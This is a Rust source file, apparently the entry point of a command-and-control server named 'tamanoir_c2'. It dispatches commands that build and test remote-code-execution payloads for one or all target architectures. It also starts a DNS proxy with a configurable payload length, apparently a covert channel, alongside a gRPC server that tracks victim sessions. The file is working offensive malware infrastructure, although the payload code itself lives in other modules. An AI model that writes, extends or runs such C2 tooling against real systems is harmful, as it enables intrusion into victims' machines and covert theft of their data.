use clap::Parser;
use log::error;
use tamanoir_c2::{
    cli::{Command, Opt, RceCommand},
    dns_proxy::DnsProxy,
    grpc::serve_tonic,
    rce::{builder::build, tester::test_bin},
    SessionsStore, TargetArch,
};

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let Opt { command } = Opt::parse();
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();

    match command {
        Command::Rce(rce_cmd) => match rce_cmd {
            RceCommand::Build {
                target_arch,
                engine,
                crate_path,
                build_vars,
                out_dir,
            } => {
                if let Err(e) = build(crate_path, engine, target_arch, build_vars, out_dir) {
                    error!("{}", e);
                    std::process::exit(1);
                }
            }
            RceCommand::Test { bin_path } => {
                if let Err(e) = test_bin(bin_path) {
                    error!("{}", e);
                    std::process::exit(1);
                }
            }
            RceCommand::BuildAll {
                engine,
                crate_path,
                build_vars,
                out_dir,
            } => {
                for arch in TargetArch::ALL {
                    if let Err(e) = build(
                        crate_path.clone(),
                        engine.clone(),
                        arch,
                        build_vars.clone(),
                        out_dir.clone(),
                    ) {
                        error!("{}", e);
                        std::process::exit(1);
                    }
                }
            }
        },
        Command::Start {
            dns_port,
            dns_forward_ip,
            dns_payload_len,
            grpc_port,
        } => {
            let dns_proxy = DnsProxy::new(dns_port, dns_forward_ip, dns_payload_len);
            let sessions_store = SessionsStore::new();
            tokio::try_join!(
                dns_proxy.serve(sessions_store.clone()),
                serve_tonic(grpc_port, sessions_store.clone())
            )?;
        }
    }
    Ok(())
}
